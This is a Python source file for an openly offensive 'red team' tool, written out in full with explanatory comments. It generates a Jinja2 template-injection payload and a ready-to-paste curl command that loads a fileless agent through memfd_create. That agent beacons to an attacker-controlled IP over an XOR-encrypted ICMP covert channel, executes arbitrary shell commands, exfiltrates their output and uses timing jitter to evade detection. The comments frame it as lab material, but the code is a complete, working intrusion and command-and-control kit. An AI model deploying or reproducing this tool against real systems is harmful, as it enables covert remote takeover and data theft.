#!/usr/bin/env python3
"""
red_attacker.py - Fileless ICMP C2 Server
================================================================================
MITRE ATT&CK : T1059.006  T1027  T1095  T1071.001  T1620
Kill Chain    : Phase 2 Weaponization → Phase 4 Exploitation → Phase 6 C2

PRINCIPLE 1 — Fileless Execution via memfd_create
--------------------------------------------------
Traditional malware writes an executable to disk (/tmp/backdoor), which:
  - Leaves a file artifact for forensic analysis
  - Triggers inotify / fanotify filesystem watchers
  - Is scanned by on-access AV/EDR agents

memfd_create(2) (Linux ≥ 3.17, syscall 319 on x86_64) creates an *anonymous
file* that lives entirely in the kernel's tmpfs layer.  Key properties:
  - Returns a file descriptor (fd) that behaves like a regular file
  - The fd is NOT linked to any directory entry — no path on any filesystem
  - The kernel assigns an inode in the "anon_inode" pseudo-filesystem
  - The content lives in page cache (RAM), never written to block device
  - /proc/<pid>/fd/<N> provides a synthetic path to the fd, allowing execve()

Attack chain:
  1. fd = syscall(319, "", 0)        # memfd_create — anonymous fd in RAM
  2. write(fd, agent_code)           # write payload to fd (still in RAM)
  3. fork()                          # parent returns to keep Flask alive
  4. execve("/usr/bin/python3",      # child executes python3 with the memfd
           ["/proc/<pid>/fd/<N>"])   # kernel resolves path → reads memfd → RCE

Why /proc/<pid>/fd/N works with execve:
  - procfs is a virtual filesystem; each entry under /proc/<pid>/fd/ is a
    symlink to the real kernel file object (struct file)
  - execve() resolves the symlink, reaches the anonymous inode, and reads
    the memfd content to load the executable/script
  - After execve(), the fd may be closed (CLOEXEC), but the kernel already
    loaded the content — the process runs from memory

Why fork() is needed:
  - The SSTI popen() subprocess must exit promptly so Flask can return
    the HTTP response.  fork() creates a child that runs independently.
  - When the parent exits, the child becomes an orphan, re-parented to PID 1.
  - The child's memfd fd is a duplicate (fork copies the fd table), so the
    memfd remains valid even after the parent closes it.

PRINCIPLE 2 — XOR Encryption
-----------------------------
XOR cipher: ciphertext[i] = plaintext[i] ^ key[i % len(key)]

Properties:
  + Symmetric: same operation encrypts and decrypts
  + Zero dependencies: no crypto library needed
  + Fast: single CPU instruction per byte
  - Vulnerable to known-plaintext attack: if attacker knows any plaintext
    byte, they recover the corresponding key byte
  - Key reuse: identical key + identical plaintext → identical ciphertext
    (no IV/nonce, unlike AES-CTR or ChaCha20)
  - NOT cryptographically secure for real operations; sufficient for lab
    demonstration of the *concept* of encrypted C2

PRINCIPLE 3 — ICMP Covert Channel
-----------------------------------
ICMP (Internet Control Message Protocol, RFC 792) is a Layer 3 protocol used
for network diagnostics (ping, traceroute, unreachable notifications).

Why ICMP makes a good covert channel:
  1. Firewalls often ALLOW ICMP by default (blocking it breaks ping/traceroute)
  2. ICMP echo request (type 8) and reply (type 0) carry an arbitrary-length
     data payload field — the protocol places no constraints on its content
  3. Most IDS/IPS inspect TCP/UDP ports and payloads, but treat ICMP payload
     as opaque diagnostic data
  4. ICMP has no port numbers → no connection state → harder to track

Raw socket behavior on Linux:
  - socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) requires root or CAP_NET_RAW
  - The kernel delivers a COPY of each incoming ICMP packet to raw sockets
  - The kernel ALSO processes echo requests internally (auto-reply)
  - We filter by ICMP ID field (0x1337) and type (8 = echo request) to
    distinguish our C2 traffic from normal pings

Our protocol over ICMP:
  ┌──────────────────────────────────────────────────────┐
  │ IP Header (20B) │ ICMP Header (8B) │ Our Payload    │
  │                 │ type=8 code=0    │ ┌────────��────┐│
  │                 │ checksum         │ │ MAGIC (1B)  ││
  │                 │ ID=0x1337        │ │ MSG_TYPE(1B)││
  │                 │ SEQ              │ │ XOR data    ││
  │                 │                  │ └─────────────┘│
  └──────────────────────────────────────────────────────┘

Both C2 server and agent send ICMP type 8 (echo request).
Both ignore type 0 (echo reply) — these are kernel auto-replies to the
other side's type 8 packets, and don't carry our protocol data.

Usage:
  sudo python3 red_attacker.py -t TARGET_IP -l ATTACKER_IP
  sudo python3 red_attacker.py -t TARGET_IP -l ATTACKER_IP --payload-only
================================================================================
"""
import socket
import struct
import sys
import os
import threading
import time
import base64
import argparse
import select
import urllib.parse

# ═══════════════════════════════════════════════════════════════
#  Protocol Constants
# ═══════════════════════════════════════════════════════════════
ICMP_ID       = 0x1337       # 16-bit identifier in ICMP header — our "magic"
MAGIC         = 0xDE         # first byte of payload — quick filter
XOR_KEY       = b"r3dt34m!@#2024xK"   # 16-byte symmetric key

MSG_HEARTBEAT = 0x01         # agent → C2: "I'm alive"
MSG_COMMAND   = 0x02         # C2 → agent: "run this shell command"
MSG_RESULT    = 0x03         # agent → C2: chunked command output

# ═══════════════════════════════════════════════════════════════
#  Embedded Agent
#
#  This Python script runs ENTIRELY IN MEMORY on the target.
#  It is never written to disk — delivered via memfd_create.
#  Only uses Python stdlib (no pip dependencies on target).
#
#  Lifecycle:
#    1. Loader creates memfd, writes this code, fork+execve
#    2. Agent opens raw ICMP socket to C2
#    3. Sends periodic heartbeats (hostname, uid, kernel)
#    4. Receives commands, executes, returns chunked results
#    5. On '__exit__' command, closes socket and terminates
# ═══════════════════════════════════════════════════════════════
AGENT_CODE = r'''#!/usr/bin/env python3
"""ICMP C2 Agent — fileless, memory-resident, XOR-encrypted"""
import socket, struct, os, subprocess, time, random, sys

C2 = "__C2_IP__"
K  = b"r3dt34m!@#2024xK"
ID = 0x1337
MG = 0xDE
HB_INTERVAL = 30

# ── XOR stream cipher ───────────────────────────────────────
# Each byte of data is XORed with the corresponding key byte
# (cycling the key).  Same function encrypts and decrypts.
def xor(d, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(d))

# ── ICMP checksum (RFC 1071) ────────────────────────────────
# The Internet checksum is the 16-bit ones' complement of the
# ones' complement sum of all 16-bit words in the header+data.
# Required by the kernel to accept outgoing ICMP packets.
def ck(p):
    if len(p) % 2:
        p += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(p) // 2), p))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (~s) & 0xffff

# ── Transmit: build ICMP echo request with encrypted payload ─
# Packet layout: [type=8][code=0][checksum][ID=0x1337][seq]
#                [MAGIC][msg_type][XOR-encrypted data]
# We compute checksum with the checksum field zeroed, then
# rebuild the header with the real checksum (standard procedure).
def tx(sk, mt, pl, sq):
    bd = bytes([MG, mt]) + xor(pl, K)
    h = struct.pack('!BBHHH', 8, 0, 0, ID, sq)
    r = h + bd
    cs = ck(r)
    sk.sendto(struct.pack('!BBHHH', 8, 0, cs, ID, sq) + bd, (C2, 0))

# ── Receive: filter for our ICMP echo requests ──────────────
# Raw ICMP socket receives ALL incoming ICMP packets.
# We must filter:
#   - Skip IP header (first 20 bytes)
#   - Check ICMP type == 8 (echo request, not reply)
#   - Check ICMP ID == 0x1337 (our identifier)
#   - Check MAGIC byte in payload
# The kernel also sends auto-replies (type 0) to incoming
# echo requests — we ignore those.
def rx(sk, to=5):
    sk.settimeout(to)
    end = time.time() + to
    while time.time() < end:
        try:
            d, a = sk.recvfrom(65535)
            if len(d) < 30:
                continue
            ic = d[20:]         # skip 20-byte IP header
            t, _, _, pi, sq = struct.unpack('!BBHHH', ic[:8])
            if pi != ID or t != 8:
                continue        # not our packet
            pl = ic[8:]         # payload after ICMP header
            if len(pl) < 2 or pl[0] != MG:
                continue        # no magic byte
            return pl[1], sq, xor(pl[2:], K)
        except socket.timeout:
            break
        except Exception:
            continue
    return None, None, None

def main():
    # SOCK_RAW + IPPROTO_ICMP: kernel delivers raw ICMP packets
    # including the IP header.  Requires root or CAP_NET_RAW.
    sk = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sq = 0
    info = f"{socket.gethostname()}|{os.getuid()}|{os.uname().release}".encode()

    # Initial heartbeat — tells C2 we're alive
    tx(sk, 0x01, info, sq)
    sq += 1
    last_hb = time.time()

    while True:
        # Periodic heartbeat every HB_INTERVAL seconds
        # Random jitter in the main loop (1.0–2.5s) adds timing noise
        # to evade pattern-based detection of periodic beacons.
        now = time.time()
        if now - last_hb > HB_INTERVAL:
            tx(sk, 0x01, info, sq)
            sq += 1
            last_hb = now

        mt, rs, data = rx(sk, 3)
        if mt == 0x02:          # Command from C2
            cmd = data.rstrip(b'\x00').decode(errors='replace')
            if cmd == '__exit__':
                break
            try:
                r = subprocess.run(cmd, shell=True, capture_output=True, timeout=15)
                out = (r.stdout or b'') + (r.stderr or b'')
                if not out:
                    out = b'[no output]'
            except Exception as e:
                out = f'[err: {e}]'.encode()

            # Chunk output into 480-byte pieces (ICMP payload size limit
            # is ~65507 bytes, but smaller chunks avoid fragmentation and
            # look more like normal ping traffic).
            # Header: [chunk_index:u16][total_chunks:u16] for reassembly.
            for i in range(0, len(out), 480):
                chunk = out[i:i + 480]
                hdr = struct.pack('!HH', i // 480, (len(out) + 479) // 480)
                tx(sk, 0x03, hdr + chunk, sq)
                sq += 1
                time.sleep(0.05)    # 50ms inter-chunk delay

        # Random sleep: 1.0–2.5s — introduces timing jitter to
        # make traffic pattern analysis harder for blue team.
        time.sleep(random.uniform(1.0, 2.5))

    sk.close()

if __name__ == '__main__':
    main()
'''

# ═══════════════════════════════════════════════════════════════
#  Crypto & ICMP Helpers
# ═══════════════════════════════════════════════════════════════

def xor_crypt(data: bytes, key: bytes) -> bytes:
    """XOR stream cipher — same function encrypts and decrypts."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def icmp_checksum(packet: bytes) -> int:
    """RFC 1071 Internet Checksum.

    Algorithm:
      1. Treat the data as a sequence of 16-bit big-endian integers
      2. Sum all integers using ones' complement addition (carry wraps)
      3. Take the ones' complement (bitwise NOT) of the final sum
    The result is placed in the checksum field of the ICMP header.
    The receiver performs the same calculation over the entire packet
    (including the checksum); if the result is 0xFFFF, the packet is valid.
    """
    if len(packet) % 2:
        packet += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(packet) // 2), packet))
    s = (s >> 16) + (s & 0xffff)   # fold 32-bit carry into 16 bits
    s += s >> 16                     # fold again (at most one more carry)
    return (~s) & 0xffff


def build_icmp_packet(msg_type: int, payload: bytes, seq: int) -> bytes:
    """Construct a complete ICMP echo request packet.

    Layout (RFC 792):
      Byte 0   : Type = 8 (echo request)
      Byte 1   : Code = 0
      Bytes 2-3: Checksum (computed over entire ICMP message)
      Bytes 4-5: Identifier (ICMP_ID = 0x1337, our C2 marker)
      Bytes 6-7: Sequence number
      Bytes 8+ : Data payload = [MAGIC][msg_type][XOR-encrypted data]

    The checksum must be computed with the checksum field set to zero,
    then patched back into the header.  This is the standard ICMP procedure.
    """
    body = bytes([MAGIC, msg_type]) + xor_crypt(payload, XOR_KEY)
    header = struct.pack('!BBHHH', 8, 0, 0, ICMP_ID, seq)
    raw = header + body
    cs = icmp_checksum(raw)
    return struct.pack('!BBHHH', 8, 0, cs, ICMP_ID, seq) + body


def send_command(sock, target_ip: str, cmd: str, seq: int) -> int:
    """Send a MSG_COMMAND ICMP packet to the agent."""
    pkt = build_icmp_packet(MSG_COMMAND, cmd.encode('utf-8'), seq)
    sock.sendto(pkt, (target_ip, 0))
    return seq + 1


# ═══════════════════════════════════════════════════════════════
#  SSTI Payload Generator
#
#  Builds a multi-layer payload that achieves fileless RCE via
#  a single HTTP POST request.
#
#  Delivery chain (4 stages):
#
#    Stage 1 — SSTI Injection
#      The Jinja2 expression {{ config.__class__.__init__
#      .__globals__['os'].popen('...').read() }} traverses
#      Python's object model to reach os.popen(), which spawns
#      a shell subprocess.
#
#    Stage 2 — Base64 Shell Pipeline
#      The shell command is: echo <B64>|base64 -d|python3
#      This decodes the loader script and pipes it to python3.
#      Double base64 encoding avoids ALL escaping issues
#      (no quotes, no special chars in the SSTI string).
#
#    Stage 3 — Loader (runs as python3 subprocess)
#      The loader:
#        a. Decodes the agent from base64
#        b. Calls memfd_create (syscall 319) → anonymous fd
#        c. Writes agent code into the fd
#        d. Calls fork() — parent exits (Flask popen returns)
#        e. Child calls execve("/usr/bin/python3",
#             ["/proc/<pid>/fd/<N>"]) — runs agent from memory
#
#    Stage 4 — Agent (runs as orphan process, entirely in RAM)
#      The agent opens a raw ICMP socket and begins beaconing
#      to the C2 server.  It never touches the filesystem.
#
# ═══════════════════════════════════════════════════════════════

def generate_ssti_payload(attacker_ip: str) -> str:
    """Build the complete SSTI payload string."""
    # Inject C2 IP into agent source code
    agent_src = AGENT_CODE.replace('__C2_IP__', attacker_ip)
    agent_b64 = base64.b64encode(agent_src.encode()).decode()

    # Loader script — the "dropper" that runs in the popen subprocess.
    #
    # ctypes.CDLL(None).syscall(319, b"", 0):
    #   - CDLL(None) loads libc (the C standard library)
    #   - .syscall(319, ...) invokes the raw Linux syscall interface
    #   - 319 is memfd_create on x86_64 (see: ausyscall --dump | grep memfd)
    #   - b"" is the name (empty string, shows as "memfd:" in /proc)
    #   - 0 is flags (no MFD_CLOEXEC, so fd survives execve)
    #
    # os.fork():
    #   - Returns 0 in child, child PID in parent
    #   - Parent exits immediately (so popen finishes and Flask responds)
    #   - Child is re-parented to init (PID 1) — becomes a daemon
    #
    # os.execve("/usr/bin/python3", [..., "/proc/<pid>/fd/<N>"], env):
    #   - Replaces the child process with python3
    #   - python3 opens /proc/<pid>/fd/<N>, reads the memfd content,
    #     and executes it as a Python script
    #   - After execve, the old Python interpreter is gone; the new one
    #     has no knowledge of how it was launched
    loader = (
        'import ctypes,os,base64\n'
        f'c=base64.b64decode("{agent_b64}")\n'
        'fd=ctypes.CDLL(None).syscall(319,b"",0)\n'
        'os.write(fd,c)\n'
        'p=os.fork()\n'
        'if p==0:\n'
        '    os.execve("/usr/bin/python3",'
        '["python3","/proc/"+str(os.getpid())+"/fd/"+str(fd)],'
        'dict(os.environ))\n'
    )
    loader_b64 = base64.b64encode(loader.encode()).decode()

    # Final SSTI expression:
    #   config.__class__  → <class 'flask.config.Config'>
    #   .__init__         → Config.__init__ method
    #   .__globals__      → module-level globals of flask/config.py
    #   ['os']            → os module (flask.config imports os)
    #   .popen('...')     → subprocess.Popen wrapper → spawns shell
    #   .read()           → reads stdout (empty, since loader forks)
    ssti = (
        "{{config.__class__.__init__.__globals__['os']"
        ".popen('echo "
        + loader_b64
        + "|base64 -d|python3').read()}}"
    )
    return ssti


def generate_curl_command(target_ip: str, target_port: int,
                          attacker_ip: str) -> str:
    """Return a ready-to-paste curl command with URL-encoded SSTI payload."""
    raw_ssti = generate_ssti_payload(attacker_ip)
    # URL-encode ALL special characters so the SSTI payload survives
    # HTTP form encoding.  Flask's request.form parser will decode it
    # back to the original Jinja2 expression.
    encoded = urllib.parse.quote(raw_ssti, safe='')
    return (
        f'curl -s -X POST http://{target_ip}:{target_port}/diag '
        f'-d "query={encoded}"'
    )


# ═══════════════════════════════════════════════════════════════
#  C2 Server
#
#  Architecture:
#    - Main thread: interactive command prompt (blocking input)
#    - Listener thread: background ICMP packet capture
#    - Communication: threading.Event for result synchronization
#
#  The listener captures ALL incoming ICMP packets on the raw
#  socket, filters for our protocol (ID + MAGIC), decrypts the
#  XOR payload, and dispatches based on message type.
#
#  Packet flow:
#    Agent → [ICMP type 8, ID 0x1337] → C2 raw socket
#    C2    → [ICMP type 8, ID 0x1337] → Agent raw socket
#    (kernel auto-replies with type 0 are ignored by both sides)
# ═══════════════════════════════════════════════════════════════

class C2Server:
    def __init__(self, target_ip: str, listen_ip: str = '0.0.0.0'):
        self.target_ip = target_ip
        self.listen_ip = listen_ip
        # Raw ICMP socket — receives ALL ICMP packets destined for this host
        self.sock = socket.socket(
            socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        self.seq = 0
        self.running = True
        self.agent_info = None
        self.result_chunks: dict[int, bytes] = {}
        self.result_total = 0
        self.result_ready = threading.Event()

    def _listener(self):
        """Background thread: capture and parse incoming ICMP packets."""
        while self.running:
            try:
                # select() with 1s timeout — non-blocking check
                ready, _, _ = select.select([self.sock], [], [], 1.0)
                if not ready:
                    continue
                data, addr = self.sock.recvfrom(65535)
                if len(data) < 30:
                    continue

                # Parse raw packet: [IP header 20B][ICMP header 8B][payload]
                icmp_data = data[20:]
                icmp_type, _, _, pkt_id, seq = struct.unpack(
                    '!BBHHH', icmp_data[:8])

                # Filter: our ID + echo request only (ignore auto-replies)
                if pkt_id != ICMP_ID or icmp_type != 8:
                    continue

                payload = icmp_data[8:]
                if len(payload) < 2 or payload[0] != MAGIC:
                    continue

                msg_type = payload[1]
                dec = xor_crypt(payload[2:], XOR_KEY)

                if msg_type == MSG_HEARTBEAT:
                    self.agent_info = dec.decode('utf-8', errors='replace')
                    parts = self.agent_info.split('|')
                    print(f"\n\033[92m[+] Agent beacon  {addr[0]}\033[0m")
                    if len(parts) >= 3:
                        print(f"    Host={parts[0]}  UID={parts[1]}  "
                              f"Kernel={parts[2]}")
                    print("\033[93mC2>\033[0m ", end='', flush=True)

                elif msg_type == MSG_RESULT:
                    # Chunked result reassembly:
                    # First 4 bytes = [chunk_index:u16][total_chunks:u16]
                    if len(dec) >= 4:
                        idx, total = struct.unpack('!HH', dec[:4])
                        self.result_chunks[idx] = dec[4:]
                        self.result_total = total
                        if len(self.result_chunks) >= total:
                            self.result_ready.set()

            except Exception:
                continue

    def send_cmd(self, cmd: str):
        self.result_chunks.clear()
        self.result_total = 0
        self.result_ready.clear()
        self.seq = send_command(self.sock, self.target_ip, cmd, self.seq)

    def wait_result(self, timeout: float = 20.0) -> str:
        if self.result_ready.wait(timeout=timeout):
            out = b''
            for i in sorted(self.result_chunks.keys()):
                out += self.result_chunks[i]
            self.result_chunks.clear()
            return out.decode('utf-8', errors='replace')
        return '\033[90m[timeout — no response from agent]\033[0m'

    def interactive(self):
        t = threading.Thread(target=self._listener, daemon=True)
        t.start()

        print("\033[91m")
        print("+" + "=" * 52 + "+")
        print("|     Red Team  Fileless ICMP C2  v1.0             |")
        print("|     XOR-Encrypted Covert Channel                 |")
        print("|     memfd_create Payload Delivery                |")
        print("+" + "=" * 52 + "+")
        print("\033[0m")
        print(f"  Target : {self.target_ip}")
        print(f"  C2 IP  : {self.listen_ip}")
        print(f"  Proto  : ICMP echo-request | ID 0x{ICMP_ID:04X}")
        print(f"  Crypto : XOR key len={len(XOR_KEY)}")
        print()
        print("  Commands:")
        print("    <cmd>      Execute shell command on target")
        print("    payload    Print SSTI curl attack command")
        print("    status     Show agent info")
        print("    exit       Kill agent & quit")
        print("    quit       Quit C2 (agent stays alive)")
        print()
        print("[*] Waiting for agent beacon...\n")

        while self.running:
            try:
                cmd = input("\033[93mC2>\033[0m ").strip()
                if not cmd:
                    continue

                if cmd == 'quit':
                    self.running = False
                    break
                if cmd == 'status':
                    if self.agent_info:
                        print(f"  Agent: {self.agent_info}")
                    else:
                        print("  \033[90mNo agent connected yet\033[0m")
                    continue
                if cmd == 'payload':
                    print(f"\n\033[96m{generate_curl_command(self.target_ip, 9999, self.listen_ip)}\033[0m\n")
                    continue
                if cmd == 'exit':
                    self.send_cmd('__exit__')
                    print("[*] Exit signal sent")
                    self.running = False
                    break

                self.send_cmd(cmd)
                result = self.wait_result()
                print(result)

            except (KeyboardInterrupt, EOFError):
                print("\n[*] Shutting down C2...")
                self.running = False
                break

        self.sock.close()


# ═══════════════════════════════════════════════════════════════
#  Main
# ═══════════════════════════════════════════════════════════════

def main():
    p = argparse.ArgumentParser(description='Red Team Fileless ICMP C2')
    p.add_argument('--target', '-t', required=True, help='Target IP')
    p.add_argument('--lhost', '-l', required=True,
                   help='Attacker IP (agent calls back here)')
    p.add_argument('--port', '-p', type=int, default=9999,
                   help='Target app port (default 9999)')
    p.add_argument('--payload-only', action='store_true',
                   help='Only print the SSTI curl command, then exit')
    args = p.parse_args()

    if args.payload_only:
        print(generate_curl_command(args.target, args.port, args.lhost))
        return

    if os.geteuid() != 0:
        print("[!] Raw ICMP socket requires root.  Run with: sudo")
        sys.exit(1)

    print("\n\033[93m[*] SSTI attack command (paste into another terminal):\033[0m\n")
    print(f"  {generate_curl_command(args.target, args.port, args.lhost)}\n")

    server = C2Server(target_ip=args.target, listen_ip=args.lhost)
    server.interactive()


if __name__ == '__main__':
    main()
